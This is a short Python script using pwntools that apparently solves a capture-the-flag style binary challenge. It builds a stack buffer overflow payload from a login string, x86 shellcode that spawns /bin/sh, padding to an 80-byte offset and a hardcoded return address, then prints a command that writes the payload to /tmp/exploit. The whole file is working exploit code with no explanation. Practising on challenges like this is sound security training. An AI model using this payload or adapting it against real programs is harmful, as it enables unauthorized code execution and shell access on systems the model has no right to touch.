from pwn import *

p32 = lambda x: util.packing.p32(x, endian='little')

offset = 80

login = b'dat_wil\n'
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\x83\xe4\xf0\xcd\x80"
padding = b'A' * (offset - len(shellcode))
jmp_addr = p32(0xffffd6dc)

exploit = login + shellcode + padding + jmp_addr


print('python -c "print(', exploit, ')" > /tmp/exploit', sep='')

